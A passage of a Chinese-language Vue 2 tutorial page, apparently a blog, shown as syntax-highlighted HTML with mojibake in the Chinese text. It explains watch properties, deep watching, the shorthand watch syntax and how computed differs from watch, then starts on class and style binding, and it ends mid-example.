class="hljs-string">&quot;changeWeather&quot;</span>&gt;</span>åˆ‡æ¢å¤©æ°”<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">isHot</span>: <span class="hljs-literal">true</span>,</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">computed</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">info</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">isHot</span> ? <span class="hljs-string">&#x27;ç‚çƒ­&#x27;</span> : <span class="hljs-string">&#x27;å‡‰çˆ½&#x27;</span></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">changeWeather</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">isHot</span> = !<span class="hljs-variable language_">this</span>.<span class="hljs-property">isHot</span></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-comment">// æ–¹å¼ä¸€</span></span><br><span class="language-javascript">    <span class="hljs-comment">/* watch:&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">isHot:&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">immediate:true,</span></span><br><span class="hljs-comment"><span class="language-javascript">handler(newValue,oldValue)&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">console.log(&#x27;isHotè¢«ä¿®æ”¹äº†&#x27;,newValue,oldValue)</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125; */</span></span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript">  <span class="hljs-comment">// æ–¹å¼äºŒ</span></span><br><span class="language-javascript">  vm.$watch(<span class="hljs-string">&#x27;isHot&#x27;</span>, &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// åˆå§‹åŒ–æ—¶è®©handlerè°ƒç”¨ä¸€ä¸‹</span></span><br><span class="language-javascript">    <span class="hljs-comment">//handlerä»€ä¹ˆæ—¶å€™è°ƒç”¨ï¼Ÿå½“isHotå‘ç”Ÿæ”¹å˜æ—¶</span></span><br><span class="language-javascript">    <span class="hljs-title function_">handler</span>(<span class="hljs-params">newValue, oldValue</span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;isHotè¢«ä¿®æ”¹äº†&#x27;</span>, newValue, oldValue)</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>â€‹      </p><p><strong>æ·±åº¦ç›‘è§† ï¼š</strong></p><ul><li>(1).Vueä¸­çš„watché»˜è®¤ä¸ç›‘æµ‹å¯¹è±¡å†…éƒ¨å€¼çš„æ”¹å˜ï¼ˆä¸€å±‚ï¼‰</li><li>(2).é…ç½®deep:trueå¯ä»¥ç›‘æµ‹å¯¹è±¡å†…éƒ¨å€¼æ”¹å˜ï¼ˆå¤šå±‚ï¼‰</li></ul><blockquote><p>å¤‡æ³¨ï¼š</p><p>(1).Vueè‡ªèº«å¯ä»¥ç›‘æµ‹&#x3D;&#x3D;å¯¹è±¡å†…éƒ¨å€¼&#x3D;&#x3D;çš„æ”¹å˜ï¼Œä½†Vueæä¾›çš„watché»˜è®¤ä¸å¯ä»¥ï¼ˆæ‰§è¡Œæ•ˆç‡é«˜ï¼‰</p><p>(2).ä½¿ç”¨watchæ—¶æ ¹æ®æ•°æ®çš„å…·ä½“ç»“æ„ï¼Œå†³å®šæ˜¯å¦é‡‡ç”¨æ·±åº¦ç›‘è§†</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;&#123; numbers &#125;&#125; <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>açš„å€¼æ˜¯:&#123;&#123; numbers.a &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;numbers.a++&quot;</span>&gt;</span>ç‚¹æˆ‘è®©a+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>bçš„å€¼æ˜¯:&#123;&#123; numbers.b &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;numbers.b++&quot;</span>&gt;</span>ç‚¹æˆ‘è®©b+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>eçš„å€¼æ˜¯:&#123;&#123; numbers.c.d.e &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;numbers.c.d.e++&quot;</span>&gt;</span>ç‚¹æˆ‘è®©e+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(value,index) of numbers.f&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span> &gt;</span>&#123;&#123; value.a &#125;&#125; <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>ç‚¹æˆ‘è®©f[0]+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;numbers = &#123;a:666,b:888&#125;&quot;</span>&gt;</span>å½»åº•æ›¿æ¢æ‰numbers<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    &#123;&#123;numbers.c.d.e&#125;&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">      <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">isHot</span>: <span class="hljs-literal">true</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">numbers</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>,</span><br><span class="language-javascript">          <span class="hljs-attr">b</span>: <span class="hljs-number">1</span>,</span><br><span class="language-javascript">          <span class="hljs-attr">c</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">d</span>: &#123;</span><br><span class="language-javascript">              <span class="hljs-attr">e</span>: <span class="hljs-number">100</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">          &#125;,</span><br><span class="language-javascript">          <span class="hljs-comment">// f:[0,1,2]</span></span><br><span class="language-javascript">          <span class="hljs-attr">f</span>: [&#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> &#125;, &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">2</span> &#125;]</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-attr">watch</span>: &#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// ç›‘è§†å¤šçº§ç»“æ„ä¸­æŸä¸ªå±æ€§çš„å˜åŒ–</span></span><br><span class="language-javascript">        <span class="hljs-string">&#x27;numbers.a&#x27;</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-title function_">handler</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;aè¢«æ”¹å˜äº†&#x27;</span>)</span><br><span class="language-javascript">          &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-comment">// ç›‘è§†å¤šçº§ç»“æ„ä¸­æ‰€æœ‰å±æ€§çš„å˜åŒ–</span></span><br><span class="language-javascript">        <span class="hljs-attr">numbers</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-attr">deep</span>: <span class="hljs-literal">true</span>,</span><br><span class="language-javascript">          <span class="hljs-title function_">handler</span>(<span class="hljs-params">newValue, oldValue</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newValue)</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;numbersæ”¹å˜äº†&#x27;</span>)</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(oldValue)</span><br><span class="language-javascript">          &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">add</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">          <span class="hljs-variable language_">this</span>.<span class="hljs-property">numbers</span>.<span class="hljs-property">f</span>[<span class="hljs-number">0</span>].<span class="hljs-property">a</span>++</span><br><span class="language-javascript">          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">numbers</span>.<span class="hljs-property">f</span>)</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>&#39;numbers.a&#39;</code>ç›‘å¬å¯¹è±¡å†…éƒ¨å€¼ è½¬ä¸ºå­—ç¬¦ä¸² <code>numbers</code>æ˜¯ç®€å†™æ–¹å¼</p><blockquote><p>ç›‘è§†å±æ€§ç®€å†™</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- å‡†å¤‡å¥½ä¸€ä¸ªå®¹å™¨--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>ä»Šå¤©å¤©æ°”å¾ˆ&#123;&#123;info&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;changeWeather&quot;</span>&gt;</span>åˆ‡æ¢å¤©æ°”<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">isHot</span>:<span class="hljs-literal">true</span>,</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">computed</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">info</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">isHot</span> ? <span class="hljs-string">&#x27;ç‚çƒ­&#x27;</span> : <span class="hljs-string">&#x27;å‡‰çˆ½&#x27;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">changeWeather</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">isHot</span> = !<span class="hljs-variable language_">this</span>.<span class="hljs-property">isHot</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">watch</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-comment">//ç®€å†™</span></span><br><span class="language-javascript">            <span class="hljs-title function_">isHot</span>(<span class="hljs-params">newValue, oldValue</span>) &#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;isHotè¢«ä¿®æ”¹äº†&#x27;</span>, newValue, oldValue, <span class="hljs-variable language_">this</span>)</span><br><span class="language-javascript">&#125; </span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>computedå’Œwatchä¹‹é—´çš„åŒºåˆ« ï¼š</strong></p><ul><li>computedèƒ½å®Œæˆçš„åŠŸèƒ½ï¼Œwatchéƒ½å¯ä»¥å®Œæˆ</li><li>watchèƒ½å®Œæˆçš„åŠŸèƒ½ï¼Œcomputedä¸ä¸€å®šèƒ½å®Œæˆï¼Œä¾‹å¦‚ï¼šwatchå¯ä»¥è¿›è¡Œå¼‚æ­¥æ“ä½œ</li></ul><blockquote><p>ä¸¤ä¸ªé‡è¦çš„å°åŸåˆ™ï¼š</p><p>1.æ‰€è¢«Vueç®¡ç†çš„å‡½æ•°ï¼Œæœ€å¥½å†™æˆæ™®é€šå‡½æ•°ï¼Œè¿™æ ·thisçš„æŒ‡å‘æ‰æ˜¯vm æˆ– ç»„ä»¶å®ä¾‹å¯¹è±¡</p><p>2.æ‰€æœ‰ä¸è¢«Vueæ‰€ç®¡ç†çš„å‡½æ•°ï¼ˆå®šæ—¶å™¨çš„å›è°ƒå‡½æ•°ã€ajaxçš„å›è°ƒå‡½æ•°ç­‰ã€Promiseçš„å›è°ƒå‡½æ•°ï¼‰ï¼Œæœ€å¥½å†™æˆç®­å¤´å‡½æ•°ï¼Œè¿™æ ·thisçš„æŒ‡å‘æ‰æ˜¯vm æˆ–ç»„ä»¶å®ä¾‹å¯¹è±¡</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- å‡†å¤‡å¥½ä¸€ä¸ªå®¹å™¨--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    å§“ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;firstName&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    åï¼š<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;lastName&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    å…¨åï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">firstName</span>:<span class="hljs-string">&#x27;å¼ &#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">lastName</span>:<span class="hljs-string">&#x27;ä¸‰&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">fullName</span>:<span class="hljs-string">&#x27;å¼ -ä¸‰&#x27;</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">watch</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-comment">// watch ç›‘è§†å™¨é‡Œå¯ä»¥å†™ å¼‚æ­¥å‡½æ•°</span></span><br><span class="language-javascript">            <span class="hljs-title function_">firstName</span>(<span class="hljs-params">val</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>)</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fullName</span> = val + <span class="hljs-string">&#x27;-&#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastName</span></span><br><span class="language-javascript">                &#125;,<span class="hljs-number">1000</span>);</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-title function_">lastName</span>(<span class="hljs-params">val</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">fullName</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">firstName</span> + <span class="hljs-string">&#x27;-&#x27;</span> + val</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-11-ç»‘å®šæ ·å¼"><a href="#1-11-ç»‘å®šæ ·å¼" class="headerlink" title="1.11 ç»‘å®šæ ·å¼"></a>1.11 ç»‘å®šæ ·å¼</h2><ul><li><strong>:class</strong>&#x3D;â€xxxâ€ï¼Œxxx å¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æ•°ç»„ã€å¯¹è±¡</li><li><strong>:style</strong>&#x3D;â€[a,b]â€å…¶ä¸­aã€bæ˜¯æ ·å¼å¯¹è±¡ï¼Œæ•°ç»„å¯¹è±¡</li><li><strong>:style</strong>&#x3D;â€{fontSize: xxx}â€å…¶ä¸­ xxx æ˜¯åŠ¨æ€å€¼<ul><li>å­—ç¬¦ä¸²å†™æ³•é€‚ç”¨äºï¼šç±»åä¸ç¡®å®šï¼Œè¦åŠ¨æ€è·å– </li><li>æ•°ç»„å†™æ³•é€‚ç”¨äºï¼šè¦ç»‘å®šå¤šä¸ªæ ·å¼ï¼Œä¸ªæ•°ä¸ç¡®å®šï¼Œåå­—ä¹Ÿä¸ç¡®å®š </li><li>å¯¹è±¡å†™æ³•é€‚ç”¨äºï¼šè¦ç»‘å®šå¤šä¸ªæ ·å¼ï¼Œä¸ªæ•°ç¡®å®šï¼Œåå­—ä¹Ÿç¡®å®šï¼Œä½†ä¸ç¡®å®šç”¨ä¸ç”¨</li></ul></li></ul><p>â€‹         </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs html">    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-class">.basic</span> &#123;<span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;<span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;&#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.happy</span> &#123;<span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid red;<span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.644</span>);</span><br><span class="language-css">          <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">30deg</span>, yellow, pink, orange, yellow);&#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.sad</span> &#123;<span class="hljs-attribute">border</span>: <span class="hljs-number">4px</span> dashed <span class="hljs-built_in">rgb</span>(<span class="hljs-number">2</span>, <span class="hljs-number">197</span>, <span class="hljs-number">2</span>);<span class="hljs-attribute">background-color</span>: skyblue;&#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.normal</span> &#123;<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#bfa</span>;&#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.atguigu1</span> &#123;<span class="hljs-attribute">background-color</span>: yellowgreen;&#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.atguigu2</span> &#123;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;<span class="hljs-attribute">text-shadow</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> <span class="hljs-number">10px</span> red;&#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.atguigu3</span> &#123;<span class="hljs-attribute">border-radius</span>: <span class="hljs-number">20px</span>;&#125;</span><br><span class="language-css">      </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>      <br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- ç»‘å®šclassæ ·å¼--å­—ç¬¦ä¸²å†™æ³•ï¼Œé€‚ç”¨äºï¼šæ ·å¼çš„ç±»åä¸ç¡®å®šï¼Œéœ€è¦åŠ¨æ€æŒ‡å®š --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;basic&quot;</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">&quot;mood&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;changeMood&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>      <br>        <span class="hljs-comment">&lt;!-- ç»‘å®šclassæ 